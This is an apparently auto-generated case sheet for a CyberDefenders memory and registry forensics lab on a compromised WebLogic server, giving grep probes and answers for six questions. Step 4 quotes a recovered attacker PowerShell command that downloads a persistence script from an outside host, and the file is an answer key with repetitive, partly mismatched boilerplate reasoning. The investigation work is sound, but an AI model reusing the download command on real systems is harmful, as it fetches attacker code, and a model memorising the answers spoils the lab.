# Chollima Lab

## Case Metadata

- Category: `Endpoint Forensics`
- Platform: `CyberDefenders`
- Difficulty: `Medium`
- Source PDF: `https://github.com/tim-barc/ctf_writeups/blob/main/writeups/cyber_defenders_weblogic_lab.pdf`

## Why This Case Matters

Use this case as a Endpoint Forensics reference for memory, registry challenges.

## Input Signals

- Artifacts: memory, registry
- Tools: cyberchef, memprocfs, strings, volatility
- Techniques: http-analysis, malware-static, memory-forensics, stego-extraction

## First-Principles Route

- Start from artifact inventory: event logs, registry hives, browser data, file system timelines, memory, and application databases.
- Build a timeline around the suspicious user, process, file path, login, persistence item, or network connection.
- Correlate logs with file and registry evidence before trusting one artifact alone.
- Extract concrete indicators such as process names, command lines, hashes, timestamps, users, and persistence locations.

## Solve Thinking

### Step 1: What is the version of the WebLogic server installed on the system?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use cyberchef, memprocfs, strings with the extracted filter/query `grep -i "weblogic" filescan.txt` and inspect the matching evidence.
- Tools: cyberchef, memprocfs, strings
- Filters or commands:
  - `grep -i "weblogic" filescan.txt`
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use cyberchef, memprocfs, strings with the extracted filter/query `grep -i "weblogic" filescan.txt` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `14.1.1.0.0`

### Step 2: WebLogic admin portal port. What is the public and WebLogic admin portal port number?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use cyberchef, memprocfs, strings with the extracted filter/query `grep -i "PortProxy" registry_keys.txt` and inspect the matching evidence.
- Tools: cyberchef, memprocfs, strings
- Filters or commands:
  - `grep -i "PortProxy" registry_keys.txt`
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use cyberchef, memprocfs, strings with the extracted filter/query `grep -i "PortProxy" registry_keys.txt` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `80:7001`

### Step 3: responsible for the initial exploit?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use cyberchef, memprocfs, strings with the extracted filter/query `grep "powershell.exe" cmdline.txt` and inspect the matching evidence.
- Tools: cyberchef, memprocfs, strings
- Filters or commands:
  - `grep "powershell.exe" cmdline.txt`
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use cyberchef, memprocfs, strings with the extracted filter/query `grep "powershell.exe" cmdline.txt` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `4752`

### Step 4: used to download the PowerShell script used for persistence?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use cyberchef, memprocfs, strings with the extracted filter/query `grep -a "192.168.144.129" pid.4344.dmp` and inspect the matching evidence.
- Tools: cyberchef, memprocfs, strings
- Filters or commands:
  - `grep -a "192.168.144.129" pid.4344.dmp`
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use cyberchef, memprocfs, strings with the extracted filter/query `grep -a "192.168.144.129" pid.4344.dmp` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `Invoke-WebRequest -Uri "http://192.168.144.129:1338/presist.ps1" -OutFile`

### Step 5: What is the MITRE ID related to the persistence technique the attacker used?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use cyberchef, memprocfs, strings with the extracted filter/query `strings pid.4344.dmp | grep -i "user-agent"` and inspect the matching evidence.
- Tools: cyberchef, memprocfs, strings
- Filters or commands:
  - `strings pid.4344.dmp | grep -i "user-agent"`
  - `strings pid.1488.vad.*`
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use cyberchef, memprocfs, strings with the extracted filter/query `strings pid.4344.dmp | grep -i "user-agent"` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `T1053.005`

### Step 6: What is the URL of the exfiltrated data?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use cyberchef, memprocfs, strings to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: cyberchef, memprocfs, strings
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use cyberchef, memprocfs, strings to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `https://pastebin.com/A0Ljk8tu`

## Reuse Checklist

- Match the new challenge's artifact and question shape against this case before copying any tool sequence.
- Start from the same evidence class, then adapt filters, fields, and timestamps to the new artifact.
- Promote any repeated manual action into a skill command before relying on it for the final solve.
